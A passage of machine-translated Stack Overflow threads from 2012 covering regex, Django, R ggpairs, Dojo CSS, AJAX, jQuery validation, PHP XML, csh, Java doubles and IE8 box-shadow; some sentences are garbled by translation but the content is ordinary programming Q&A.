这可以从下面的例子中理解：

```
Pattern pattern1 = Pattern.compile("(.*?)(<|>|<=|=|>=)(.*)");
Matcher matcher2 = pattern1.matcher("4>=5");
while (matcher2.find()) {
        System.out.println(matcher2.group(1) + ";" + matcher2.group(2)+ ";" + matcher2.group(3));
} 
```

输出：

```
4;>;=5 
```

预期的输出是，`4;>=;5`但是由于操作员的独立`>=`存在，操作员被分裂了。`>`

我想以`(<|>|<=|=|>=)`贪婪的方式评估该子句，以便将其`>=`视为单个实体并在它们一起出现时被列出。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T20:30:09.097

你可以尝试简化为

```
 pattern1 = Pattern.compile("(.*?)(>=?|<=?|=)(.*)"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T20:32:48.860

```
String testt = "4>=5";
System.out.println(testt.replaceAll("(.*?)(>=?|<=?|=)(.*)", "$1;$2;$3")); 
```

易于理解，您将立即更换所有内容。你犯了一个错误，如果它在它之前找到一个 <= 就会停止获取，所以只需将这 2 个 <= 和 >= 放在第一位。

# python - Django 获取客户端的域名/主机名

> ID：13093951
> 
> 赞同：2
> 
> 时间：2012-10-26T20:25:57.900
> 
> 标签：python, django, gethostbyaddr

获取用户主机/域名的最简单方法是什么（如果有）？或者有没有一个函数可以查找用户的IP地址，看看它是否绑定到一个命名地址？（即 PHP 中的 gethostbyaddr()）

HttpRequest.get_host() 只返回用户的 IP 地址。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-26T20:31:16.147

您不能依赖它，但您可以尝试使用以下字典中的[`request.META['REMOTE_HOST']`](https://docs.djangoproject.com/en/dev/ref/request-response/#django.http.HttpRequest.META)or ：[`request.META['HTTP_HOST']`](https://docs.djangoproject.com/en/dev/ref/request-response/#django.http.HttpRequest.META)`META``request`

> 包含所有可用 HTTP 标头的标准 Python 字典。可用的标头取决于客户端和服务器，但这里有一些示例：

```
- REMOTE_HOST -- The hostname of the client.
- HTTP_HOST -- The HTTP Host header sent by the client. 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-26T20:30:52.090

您可以使用[`socket.gethostbyaddr()`](http://docs.python.org/library/socket.html#socket.gethostbyaddr)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-08-07T23:59:37.840

您可以打印`HttpRequest.META`并找到您想要的东西，我认为`req.META['HTTP_ORIGIN']`这是您需要的东西，它与浏览器地址栏的值相同。

# r - 使用带有 NA 连续数据的 ggpairs

> ID：13093954
> 
> 赞同：9
> 
> 时间：2012-10-26T20:26:04.837
> 
> 标签：r, ggplot2

`ggpairs`在包中似乎非常有用，但是当数据集中的任何地方存在`GGally`时，它似乎会失败：`NA`

```
#require(GGally)
data(tips, package="reshape")
pm <- ggpairs(tips[,1:3]) #works just fine

#introduce NA
tips[1,1] <- NA
ggpairs(tips[,1:3])
> Error in if (lims[1] > lims[2]) { : missing value where TRUE/FALSE needed 
```

我没有看到任何处理`NA`值的文档，并且`ggpairs(tips[,1:3], na.rm=TRUE)`（不出所料）之类的解决方案不会更改错误消息。

我有一个数据集，其中可能有 10% 的值`NA`随机分布在整个数据集中。因此`na.omit(myDataSet)`将删除大部分数据。有没有办法解决？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-27T01:02:02.780

一些`GGally`类似的功能支持通过参数`ggparcoord()`处理 NA 。然而，不幸`missing=[exclude,mean,median,min10,random]`的是，情况并非如此。`ggpairs()`

您可以做的是用对您期望的数据的良好估计来替换 NA，这些数据`ggpair()`会自动为您完成。有很好的解决方案，比如用[row mean](https://stackoverflow.com/questions/6918086/replace-na-values-by-row-means)、[zeros](https://stackoverflow.com/questions/8161836/how-do-i-replace-na-values-with-zeros-in-r)、[median](https://stackoverflow.com/questions/11971876/how-to-fill-na-with-median)甚至[最接近的点](https://stackoverflow.com/questions/12041563/r-replacing-na-with-value-of-closest-point)替换它们（注意最近句子单词上的 4 超链接！）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-07-01T18:03:05.483

据我所知，ggpairs() 无法解决这个问题。此外，您不填写“假”数据是绝对正确的。如果在这里建议合适，我会建议使用不同的绘图方法。例如

```
 cor.data<- cor(data,use="pairwise.complete.obs") #data correlations ignoring pair-wise NA's
 chart.Correlation(cor.data) #library(PerformanceAnalytics) 
```

或使用此处的代码[http://hlplab.wordpress.com/2012/03/20/correlation-plot-matrices-using-the-ellipse-library/](http://hlplab.wordpress.com/2012/03/20/correlation-plot-matrices-using-the-ellipse-library/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-01-20T10:42:29.443

我会用我自己可怕的解决方法来尝试它，因为我认为这需要刺激。我同意 OP 的观点，即基于统计假设或选择的 hack 填充数据对于探索性分析来说是一个糟糕的主意，我认为一旦你忘记它是如何工作的（对我来说大约五天）并且需要调整，它肯定会失败它是为了别的东西。

***免责声明***

这是一种糟糕的做事方式，我讨厌它。当您有来自高维数据集的稀疏采样（可能是 OP 有）的系统性 NA 来源时，它*很有用。*

### 例子

假设您有一些非常大的数据集的一小部分，使您的一些列稀疏表示：

```
|  Sample (0:350)|  Channel(1:118)|  Trial(1:10)|     Voltage|Class  (1:2)|  Subject (1:3)|
|---------------:|---------------:|------------:|-----------:|:-----------|--------------:|
|               1|               1|            1|  0.17142245|1           |              1|
|               2|               2|            2|  0.27733185|2           |              2|
|               3|               1|            3|  0.33203066|1           |              3|
|               4|               2|            1|  0.09483775|2           |              1|
|               5|               1|            2|  0.79609409|1           |              2|
|               6|               2|            3|  0.85227987|2           |              3|
|               7|               1|            1|  0.52804960|1           |              1|
|               8|               2|            2|  0.50156096|2           |              2|
|               9|               1|            3|  0.30680522|1           |              3|
|              10|               2|            1|  0.11250801|2           |              1|

require(data.table) # needs the latest rForge version of data.table for dcast
sample.table <- data.table(Sample = seq_len(10), Channel = rep(1:2,length.out=10),
                           Trial = rep(1:3, length.out=10), Voltage = runif(10), 
                           Class = as.factor(rep(1:2,length.out=10)),
                           Subject = rep(1:3, length.out=10)) 
```

这个例子很糟糕，但假装这些列是从它们更大的子集中统一采样的。

假设您想将数据沿所有通道转换为宽格式以使用`ggpairs`. 现在，对于一列或其他情况，规范的`dcast`回归宽格式将不起作用`id`，因为列范围是稀疏（并且永远不会完全）表示的：

```
wide.table <- dcast.data.table(sample.table, Sample ~ Channel,
                                   value.var="Voltage",
                                   drop=TRUE)

> wide.table
        Sample         1          2
     1:      1 0.1714224         NA
     2:      2        NA 0.27733185
     3:      3 0.3320307         NA
     4:      4        NA 0.09483775
     5:      5 0.7960941         NA
     6:      6        NA 0.85227987
     7:      7 0.5280496         NA
     8:      8        NA 0.50156096
     9:      9 0.3068052         NA
    10:     10        NA 0.11250801 
```

在这种情况下，很明显哪个列会起作用`id`，因为它是一个玩具示例`sample.table[,index:=seq_len(nrow(sample.table)/2)]`（`id`当应用于公式参数时。这个kludge将起作用：

```
setkey(sample.table,Class) 
```

最后我们需要这个来确保顺序是固定的。

```
chan.split <- split(sample.table,sample.table$Channel) 
```

这将为您提供每个唯一频道的 data.frames 列表。

```
cut.fringes <- min(sapply(chan.split,function(x) nrow(x)))
chan.dt <- cbind(lapply(chan.split, function(x){
  x[1:cut.fringes,]$Voltage})) 
```

必须有更好的方法来确保每个 data.frame 具有相同数量的行，但是对于我的应用程序，我可以保证它们只有几行不同，所以我只是修剪掉多余的行。

```
chan.dt <- as.data.table(matrix(unlist(chan.dt),
                 ncol = length(unique(sample.table$Channel)), 
                 byrow=TRUE)) 
```

这将使您回到一个大数据表，其中以 Channels 作为列。

```
chan.dt[,Class:=
         as.factor(rep(0:1,each=sampling.factor/2*nrow(original.table)/ncol(chan.dt))[1:cut.fringes])] 
```

最后，我重新绑定了我的分类变量。这些表应该已经按类别排序，所以这将匹配。这假设您拥有包含所有数据的原始表；还有其他方法可以做到这一点。

```
ggpairs(data=chan.dt,
        columns=1:length(unique(sample.table$Channel)), colour="Class",axisLabels="show") 
```

现在它可以用上面的方法绘制了。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2021-12-23T09:43:51.357

我看到这是一个旧帖子。最近我遇到了同样的问题，但在网上还是找不到解决办法。所以我在 FYI 下面提供了我的解决方法。

我认为目的是使用成对的完整观察进行绘图（即以特定于`ggpairs`网格图的每个面板/方面的方式），而不是对所有变量使用完整的观察。前者将最大程度地保留“可用”的观察结果，而不会通过估算缺失值来引入“人工”数据。到目前为止，似乎`ggpairs`仍然不支持这一点。我的解决方法是：

1.  `NA`使用数据中不存在的另一个值进行编码，例如对于数值变量，我将`NA`'s 替换`-666`为我的数据集。对于每个数据集，您始终可以选择超出其数据值范围的内容。顺便说一句，这似乎`Inf`不起作用；
2.  然后使用用户创建的绘图函数检索成对的完整案例。例如，对于下三角形中连续变量的散点图，我会执行以下操作：

```
scat.my <- function(data, mapping, ...) {
  x <- as.character(unclass(mapping$x))[2] # my way of parsing the x variable name from `mapping`; there may be a better way
  y <- as.character(unclass(mapping$y))[2] # my way of parsing the y variable name from `mapping`; there may be a better way
  dat <- data.table(x=data[[x]], y=data[[y]])[x!=-666 & y!=-666] # I use the `data.table` package; assuming NA values have been replaced with -666
  ggplot(dat, aes(x=x, y=y)) +
    geom_point()
}

ggpairs(my.data, lower=list(continuous=scat.my), ...) 
```

这可以类似地对上三角形和对角线进行。这有点费力，因为所有的绘图功能都需要通过上面的自定义修改手动重新完成。但它确实奏效了。

# python - Python /正则表达式令牌转换与参数捕获

> ID：13093955
> 
> 赞同：0
> 
> 时间：2012-10-26T20:26:05.897
> 
> 标签：python, regex

我有一个形式为：

`"Hello, this is a test. Let's tag @[William Maness], and then tag @[Another name], along with @[More Name]."`

我想把它转换成...

`"Hello, this is a test. Let's tag <a href='/search/william-maness'>William Maness</a>, and then tag <a href='/search/another-name'>Another name</a>, along with [...]"`

我很确定这可以用正则表达式来完成，但它对我来说有点太复杂了。任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T20:27:36.320

您可以将任何这样的名称与：

```
r'@\[([^]]+)\]' 
```

捕获组将原始文本中括号内的名称包围起来。

然后，您可以使用传递给的函数来`sub()`用链接替换名称，基于您拥有的查找：

```
def replaceReference(match):
    name = match.group(1)
    return '<a href="/search/%s">%s</a>' % (name.lower().replace(' ', '-'), name)

refs = re.compile(r'@\[([^]]+)\]')
refs.sub(replaceReference, example) 
```

该函数为找到的每个匹配项传递一个匹配对象；使用 检索捕获组`.groups(1)`。

在此示例中，名称以一种非常简单的方式进行转换，但是您可以进行实际的数据库检查，例如，名称是否存在。

演示：

```
>>> refs.sub(replaceReference, example)
'Hello, this is a test. Let\'s tag <a href="/search/william-maness">William Maness</a>, and then tag <a href="/search/another-name">Another name</a>, along with <a href="/search/more-name">More Name</a>.' 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-26T20:29:57.387

`re.sub()`也接受函数，因此您可以处理替换文本：

```
import re

text = "Hello, this is a test. Let's tag @[William Maness], and then tag @[Another name], along with @[More Name]."

def replace(match):
    text = match.group(1)  # Extract the first capturing group

    return '<a href="/search/{0}">{1}</a>'.format(  # Format it into a link
        text.lower().replace(' ', '-'),
        text
    )

re.sub(r'@\[(.*?)\]', replace, text) 
```

或者，如果您正在寻找一个可读的单行：

```
>>> import re
>>> re.sub(r'@\[(.*?)\]', (lambda m: (lambda x: '<a href="/search/{0}">{1}</a>'.format(x.lower().replace(' ', '-'), x))(m.group(1))), text)
'Hello, this is a test. Let\'s tag <a href="/search/william-maness">William Maness</a>, and then tag <a href="/search/another-name">Another name</a>, along with <a href="/search/more-name">More Name</a>.' 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T20:32:54.623

使用@Martijn 的正则表达式：

```
>>> s
"Hello, this is a test. Let's tag @[William Maness], and then tag @[Another name], along with @[More Name]."
>>> re.sub(r'@\[([^]]+)\]', r'<a href="/search/\1</a>', s)
'Hello, this is a test. Let\'s tag <a href="/search/William Maness</a>, and then tag <a href="/search/Another name</a>, along with <a href="/search/More Name</a>.' 
```

不过，您需要 slgiy 您的用户名。

# javascript - Dojo Dijit 样式问题

> ID：13093958
> 
> 赞同：1
> 
> 时间：2012-10-26T20:26:09.267
> 
> 标签：javascript, css, dojo, tabcontainer

我正在尝试将 a`dijit/layout/TabContainer`与修改后的 dijit 主题一起使用。我需要修改选项卡的一些样式，`TabContainer`例如选项卡的填充、粗体等。但是，特定于使用的页面的样式命令`TabContainer`不起作用。

这段代码在我主页的 CSS 文件中。

```
.myTheme .homeTabContent
{
    font-weight: bold !important;
}

.myTheme .homeTabContent .dijitTab /* The .dijitTab is the original CSS class of the tab*/
{
    font-weight: bold !important;
    padding-left: 3px !important;
    padding-right: 3px !important;
} 
```

尽管`!important`. 编辑`TabContainer`CSS 文件`myTheme`不是一个实用的解决方案，因为我只会弄乱不同页面的样式。发生的情况是，当我加载带有样式的页面时，我的命令似乎正在工作一瞬间，但是当`TabContainer`完成加载时，所有这些都被撤消了。谁能告诉我为什么或给我一个解决方案？提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T07:36:50.380

Here is a working solution. [http://jsfiddle.net/oamiamgod/rd58M/](http://jsfiddle.net/oamiamgod/rd58M/)

I have included class `myTheme` to body tag. Like this

```
<body class="claro myTheme"> 
```

*I'm not good at english but I will try to explain.*

If you write css like this `.myTheme .homeTabContent .dijitTab` that mean an element of class `homeTabContent` have to stay inside some element that has class `myTheme`

Like this

```
<body class="claro myTheme">
    <div class="homeTabContent">
        <div class="dijitTab"></div>
    </div>
</body> 
```

But if you write css like this `.myTheme.homeTabContent.dijitTab` (with no space) it will be

```
<div class="myTheme homeTabContent dijitTab"></div> 
```

# javascript - AJAX/Javascript 功能不工作

> ID：13093959
> 
> 赞同：0
> 
> 时间：2012-10-26T20:26:11.997
> 
> 标签：javascript, html, ajax, function

嗨，我正在使用 ajax 调用一个名为 build_Array 的函数。此函数应分解 myString ，即“致电 1-877-968-7762 开始您的休假。,1,0,通过；您有资格获得 50% 的工资。,1,365,通过；您的休假将是无薪的。, 1,0，之后；" 分成由逗号划分成二维数组的部分。但它不起作用。它说数组的所有值都是未定义的。这是我在 ajax 中调用函数的地方......（它在 jsfiddle [http://jsfiddle.net/ChaZz/3/](http://jsfiddle.net/ChaZz/3/)中工作）

```
var request = new XMLHttpRequest();
  request.onreadystatechange = function() {
    if (request.readyState == 4 && request.status == 200) {
      var myString = request.responseText;
      myString = build_Array(myString);
      document.getElementById('ajax').innerHTML = myString;
    }
  } 
```

这是函数 build_Array...

```
function build_Array (myString) {
  var mySplitResult = myString.split(';');
  var myArray = new Array(mySplitResult.length);

  //may need to get rid of -1
  for(var i = 0; i < mySplitResult.length -1; i++){
    myArray[i] = new Array(4);
    var mySplitResult2 = mySplitResult[i].split(',');

    for(var z = 0; z < mySplitResult2.length; z++) {
        myArray[i][z] = mySplitResult2[z];
    }
  }
  var final_message = myArray[1][1];
  return final_message;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T20:34:39.880

[http://jsfiddle.net/ChaZz/5/](http://jsfiddle.net/ChaZz/5/)

```
var myString = "Call 1-877-968-7762 to initiate your leave.,-30,0,through;You are eligible to receive 50% pay.,0,365,through;Your leave will be unpaid.,365,0,After;";

function build_Array (myString) {
  var mySplitResult = myString.split(';');
  var myArray = [];

  for(var i = 0; i < mySplitResult.length; i++){
    myArray[i] = [];
    var mySplitResult2 = mySplitResult[i].split(',');

    for(var z = 0; z < mySplitResult2.length; z++) {
        myArray[i][z] = mySplitResult2[z];
    }
  }
  var final_message = myArray[1][1];
  return final_message;
}

console.log(build_Array(myString)); // 0 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T22:28:23.343

循环不需要从 mySplitArray2 复制到 myArray，只需将返回的数组`split`直接分配给新数组的该元素即可。并可`array.push`用于增量构建数组。

```
function build_Array (myString) {
  var myArray = [];
  for (substring in myString.split(';')){
    myArray.push(substring.split(','));
  }
  var final_message = myArray[1][1];
  return final_message;
} 
```

# debugging - 使用 Matlab 调试器在函数中发生错误时跳出调用者

> ID：13093968
> 
> 赞同：0
> 
> 时间：2012-10-26T20:27:08.650
> 
> 标签：debugging, matlab

我的 Matlab 代码如下所示：

```
for t = 1:T
   arg = (do some calculation)
   func(arg)
end 
```

我知道循环中的计算有问题导致`func`. 但是，如果我将调试器设置为在出现错误时停止，它将在`func`. 我真正需要的是走出`func`并进入 for 循环，看看计算出了什么问题。T 是一个巨大的数字，因此手动单步执行不是一种选择。我也无法传递`t`给，`func`因为整段代码都是只读的。`func`有没有办法让调试器在发生错误时退出？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T21:53:51.557

一旦您的函数在调试器中停止，您可以切换堆栈的一个（或多个）级别，以检查调用函数中出了什么问题。

最简单的方法可能是通过 GUI，您可以在其中使用下拉菜单在工作区之间切换，但也可以在命令行上使用[DBUP 。](http://www.mathworks.com/help/matlab/ref/dbup.html)

R2012a 及更早版本： ![在此处输入图像描述](../Images/ec34527610a3a8f5c172e844d6d3fe61.png)

R2012b 及更高版本： ![在此处输入图像描述](../Images/aba7a53cd6403706f69fb95797bfbc09.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T20:30:15.893

尝试使用`try`：

```
for t = 1:T
   arg = (do some calculation)
   try
       func(arg)
   catch
       z = 1;
   end
end 
```

然后只需设置你的调试点就行了`z = 1;`。当错误发生时`func`，程序将跳转到该`z = 1;`行，您的调试点将停止运行并允许您检查工作区。完毕！

# jquery - 为什么不传递更新的元素值？

> ID：13093969
> 
> 赞同：0
> 
> 时间：2012-10-26T20:27:11.567
> 
> 标签：jquery, ajax, this, jsonserializer

我目前检查输入/文本区域/复选框/选择是否更改，如果是，那么我想启动我的函数来搜索数据库并更新“结果”div。现在这就是我到目前为止所拥有的..

它适用于更改没问题，唯一的问题是现在当我更改表单项时，它会检测到它，但新值不会传递给 .php 文件。建议？

**注意**：我尝试使用 $(this).serialize(); 但这对我不起作用。我只是想将所有指定的表单变量传递给 PHP 文件。

```
$(document).ready(function() { 

    $("select,:checkbox").change(function(){ inits(); });
    $("input,textarea").keystop(function(){ inits(); });

    a = "GET";
    b = "#recipeSearch";
    c = $(b).attr('action') + '?r';
    f = "#searchResults";

    function inits(){

        var values = {
            'term' : $("input#searchterm").val(),
            'photos' : $(b + " #requirephotos").val(),
            'prep' : $(b + " #preptime").val(),
            'cook' : $(b + " #cooktime").val()
        }

        console.log('Search Init');

        $.ajax({
            url: c,
            cache: false,
            dataType: 'json',
            data: values,  // $(b).serialize(); // this still didn't work
            success: function(response) {
                //decoded = JSON.stringify(response);

                if (response) {
                    $(f).html(response);
                }

                //$.each(r.items, function(i,data){} //usage later on 
            },
            error: function(e, jqxhr, settings, exception) {
                console.log('Error: ' + e.toString() + ' - ' + jqxhr);
            }
        });
    }

}); 
```

任何和所有的建议表示赞赏。我没有 jsfiddle 给你，因为它使用另一个脚本作为 keystop。

**示例 JSON**

```
{
"items": [
        "item 1",
        "item 2",
        "item 3",
        "item 4",
        "item 5"
        ]
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-27T20:37:58.413

我已经解决了这个问题。不知道是什么问题，但现在已经解决了。

**编辑**修复是..我想我可以将其缩小到服务器端问题。如果请求文件在白名单上，我从中检索的 php 文件仅提供信息，但我的文件不在，并将其添加到白名单解决了问题。

# javascript - 添加 jQuery 验证方法时 this.optional(element) 做了什么？

> ID：13093971
> 
> 赞同：42
> 
> 时间：2012-10-26T20:27:16.123
> 
> 标签：javascript, jquery, html, forms, validation

请参阅文档：
[https ://jqueryvalidation.org/jQuery.validator.addMethod/](https://jqueryvalidation.org/jQuery.validator.addMethod/)

我想知道是什么`this.optional(element)`。我创建了两个表单来测试：
[Form1](https://jsfiddle.net/Mori/ctLqyzhc/)和[Form2——](https://jsfiddle.net/Mori/Lu0nsaub/)一个有`this.optional(element)`，另一个没有。从理论上讲，根据Andrew Whitaker对[这个答案的一些评论：](https://stackoverflow.com/a/12756090/478018)

> 所做`this.optional`的只是说“如果该字段是可选的，如果它是空白则返回true”

和

> `this.optional`检查基本上是在评估它是否符合规则之前检查该字段是否为空白。

但实际上，我认为[Form1](https://jsfiddle.net/Mori/ctLqyzhc/)和[Form2](https://jsfiddle.net/Mori/Lu0nsaub/)的工作方式没有区别。请帮助我理解行动的区别。

* * *

## 回答 #1

> 赞同：49
> 
> 时间：2012-10-26T22:02:28.167

好的...所以在您的示例中，该字段在任何一种形式中都不会是空白的。它要么具有占位符值，要么具有电子邮件地址的尝试。`this.optional(element)`如果元素为空且不需要，则整个要点是立即返回 true。

所以如果你有这两种方法：

```
jQuery.validator.addMethod("BOB", function (value, element) {
    return this.optional(element) || 
        element.value === 'BOB';
}, 'You did not enter BOB');

jQuery.validator.addMethod("mustbeBOB", function (value, element) {
    return element.value === 'BOB';
}, 'You did not enter BOB'); 
```

添加一个类`BOB required`与输入一个类是一样的`mustbeBOB`。与具有`BOB`允许空白或“BOB”的类`mustbeBOB`相比，与仅通过值为 的验证的类相比`BOB`，空白将失败。这更有意义吗？

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-26T20:59:06.020

`this.optional`旨在用于通用验证方法，可能与必需或可选元素一起使用。如果该字段未填写，它允许他们跳过所有自己的检查。如果该字段是可选的且为空白，则方法调用`this.optional`立即成功返回。

通过使用它，该方法可以假设该值是非空的，这可以简化其其余的编码。

# php - XML“树”到多级html列表

> ID：13093975
> 
> 赞同：3
> 
> 时间：2012-10-26T20:27:33.430
> 
> 标签：php, xml, xslt

我有一个 XML 文件，我想将其显示为多级列表

```
<items>
  <item>
    <parent_id>1</parent_id>  
    <id>1876</id>
    <name>foobar1</name>
  </item>
  <item>
    <parent_id>1876</parent_id>
    <id>1877</id>
    <name>foobar11</name>
  </item>
  <item>
    <parent_id>1877</parent_id>
    <id>1878</id>
    <name>foobar111</name>
  </item>
  <item>
    <parent_id>1877</parent_id>
    <id>1879</id>
    <name>foobar112</name>
  </item>
  <item>
    <parent_id>1877</parent_id>
    <id>1880</id>
    <name>foobar113</name>
  </item>
...
</items> 
```

我想显示如下：

```
<ul>
    <li>foobar1</li>
    <li>
      <ul>
        <li>foobar11</li>
        <li>
          <ul>
            <li>foobar111</li>
            <li>foobar112</li>
            <li>foobar113</li>
          </ul>
        </li>
      </ul>
    </li>
...
</ul> 
```

我尝试循环执行（我使用的是 simplexml）：

```
 $catxml = simplexml_load_file('file.xml');  
    $nodes=$catxml->xpath("//item");    
    $gile=0;
    $ile=0;

    foreach($nodes as $node) {
        $par = $node->parent_id;
        $id = $node->id;
        $naz = $node->name;

        if($par=='1'){ $gile++;  $ile++; echo '<li><a href="#url">'.$id.'-'.$naz.'</a></li>';
        settype($id,'integer');         
            foreach($nodes as $nodea) {
                $apar = $nodea->parent_id;
                $aid = $nodea->id;
                $anaz = $nodea->name;
                settype($aid,'integer');
                $apoczatek='';
                if($apar!='1' AND $apar==$id AND $aid>$id){ $ile++; if($apoczatek!=''){echo '</ul></li>';}echo '<li><ul><li><a href="#url">'.$aid.'-'.$anaz.'</a></li>';
                    foreach($nodes as $nodea) {
                        $bpar = $nodea->parent_id;
                        $bid = $nodea->id;
                        $bnaz = $nodea->name;
                        $bpoczatek='';
                        settype($bid,'integer');
                        if($bpar==$aid AND $bid>$aid){ $ile++; if($bpoczatek!=''){echo '</ul>';}echo '<ul><li><a href="#url">'.$bid.'-'.$bnaz.'</a></li>';
                            foreach($nodes as $nodea) {
                                $cpar = $nodea->parent_id;
                                $cid = $nodea->id;
                                $cnaz = $nodea->name;
                                $cpoczatek='';
                                settype($cid,'integer');
                                if($cpar==$bid AND $cid>$bid){ $ile++; if($cpoczatek!=''){echo '</ul>';}echo '<ul><li><a href="#url">'.$cid.'-'.$cnaz.'</a></li>';
                                    foreach($nodes as $nodea) {
                                        $dpar = $nodea->parent_id;
                                        $did = $nodea->id;
                                        $dnaz = $nodea->name;
                                        $dpoczatek='';
                                        settype($did,'integer');
                                        if($dpar==$cid AND $did>$cid){ $ile++; if($dpoczatek!=''){echo '</ul>';}echo '<ul><li><a href="#url">'.$did.'-'.$dnaz.'</a></li>';
                                            foreach($nodes as $nodea) {
                                                $epar = $nodea->parent_id;
                                                $eid = $nodea->id;
                                                $enaz = $nodea->name;
                                                $epoczatek='';
                                                settype($eid,'integer');
                                                if($epar==$did AND $eid>$did){ $ile++; if($epoczatek!=''){echo '</ul>';}echo '<ul><li><a href="#url">'.$eid.'-'.$enaz.'</a></li>';

                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    } 
```

但它没有用 - 错过`<ul>`和`</ul>`标签

对我的方法有什么建议吗？还有其他方法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-11T13:02:46.657

我将递归函数用于递归数据。我也注释掉了`// echo "</li>\n<li>";`：你想要的 HTML 结构需要它，但我不喜欢它。

```
$catxml = simplexml_load_file('file.xml');  
$nodes=$catxml->xpath("//item");

$children = array();

foreach($nodes as $node) {
    $parent_id = (int) $node->parent_id;
    if(! array_key_exists ($parent_id, $children)) {
        $children[$parent_id] = array();
    }
    $children[$parent_id][] = $node;
}

function renderChildrenList( &$children, $id) {
    echo "\n<ul>";
    foreach($children[$id] as $node) {
        echo "\n<li>" . $node->id . '-' . $node->name;

        $child_id = (int) $node->id;
        if(array_key_exists($child_id, $children)) {
            // echo "</li>\n<li>";
            renderChildrenList($children, $child_id);
        }

        echo "</li>";
    }
    echo "\n</ul>";
}

// I assume root_id=1
renderChildrenList( $children, 1, 0); 
```

# linux - csh 中的 foreach 语法

> ID：13093977
> 
> 赞同：2
> 
> 时间：2012-10-26T20:27:35.753
> 
> 标签：linux, shell, csh

对于这个`csh`脚本

```
#!/bin/csh

foreach file in (.)
  echo "$file"
end 
```

我收到这个错误

```
foreach: Words not parenthesized. 
```

我该如何解决？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-26T20:31:40.060

应该没有`in`：

```
foreach file ( . ) 
```

请务必阅读[停止使用（和教学）C-Shell](http://www.shlomifish.org/open-source/anti/csh/)。

# java - java双重计算

> ID：13093982
> 
> 赞同：2
> 
> 时间：2012-10-26T20:27:44.370
> 
> 标签：java, double

我知道计算机不能精确地表示非整数。所以当我在java中添加2个双打时：

```
724.64d + 1000d 
```

控制台打印出 1724.6399999999999

`724.64d + 100d`但为什么`724.64d + 10000d`

控制台分别打印出 824.64 和 10724.64？

有没有办法知道当我添加 2 个双打时在什么条件下，总和是确切的数字？

我问的原因是因为我们的旧程序使用 double 进行计算。并使用双重比较来验证数字。例如：假设总数为`1849.64`，所有输入量加起来必须等于总数，即`1849.64`

```
input 1: 724.64
input 2: 1125 
```

将不起作用，因为总和将为 1849.6399999999999

但是如果我们像下面这样输入就可以了，总和是 1849.64

```
input 1: 24.64
input 2: 1825 
```

那么如何找到那些有效的组合呢？请注意，我无权访问这个特定的非常旧的程序。当验证失败时，我们必须像第二个输入组合一样手动找到一个走动。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T20:34:55.170

```
BigDecimal bigDecimal = new BigDecimal(724.64);
bigDecimal = bigDecimal.add(new BigDecimal(1000.0));
System.out.println(bigDecimal.floatValue());<--Works fine 
System.out.println(bigDecimal.doubleValue());<--Works as mentioned in Question 
```

输出：

```
1724.64
1724.6399999999999 
```

在第一种情况下，它之所以起作用，是因为`narrowing primitive conversion`发生了。但是对于浮点数，您将不得不接受并接受它。

正如我所说的它对原语有效的原因

```
double d = 724.64;
double d1 = 1000.0;
System.out.println(d + d1);
System.out.println((float) (d + d1)); 
```

输出：

```
1724.64
1724.6399999999999 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T20:31:13.520

浮点数不代表十进制的数字，而是在二进制系统中，显然它们只有有限的精度，因此十进制系统表示的确切值与浮点数可以表示的值之间存在不匹配。你不能期望它会这样做。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-26T20:36:46.023

与其尝试确定导致精确或不精确计算的条件，不如考虑在这些情况下使用[BigDecimal](http://docs.oracle.com/javase/1.5.0/docs/api/java/math/BigDecimal.html)。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-26T20:56:55.593

要回答您的最后一个问题，如果小数部分是 2 的负幂，例如零、1/ *2、1* /4、1/16 ......情况，就像您发布的情况一样，如果您用来将它们转换为十进制的 API（例如 System.out.println()）进行舍入或截断，并且该值足够接近以使舍入或截断产生预期的答案。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-26T20:37:33.563

如果比较是问题，作为一种解决方法，我建议将字符串中的数字格式化为小数点后 2 位并四舍五入，然后比较字符串：

```
 double expectNum = 1849.64;
        double resultNum = 1849.639999;

        String expectedString = String.format("%.2g%n", expectNum);
        String resultString = String.format("%.2g%n", resultNum);

        if(expectedString.equals(resultString)){
           //result matched
           //return true;
        }else{
           //return false;
        } 
```

# html - 插图框阴影 IE8

> ID：13093985
> 
> 赞同：0
> 
> 时间：2012-10-26T20:28:15.730
> 
> 标签：html, internet-explorer, css, internet-explorer-8

我有一个显示插入框阴影的[小提琴。](http://jsfiddle.net/QsWYA/)

我想在 IE 中实现这种类型的效果有没有我可以应用的 jquery 框阴影，可以解决 IE 的问题？

我查看了 htcPIE，但它在我当前的应用程序中表现不佳。还有其他提示吗？

在现代浏览器中工作的代码是：

```
 -moz-box-shadow: inset 3px 3px 4px #000;
 -webkit-box-shadow: inset 3px 3px 4px #000;
  box-shadow: inset 3px 3px 4px #000; 
```

我在 IE 中查看如下：

```
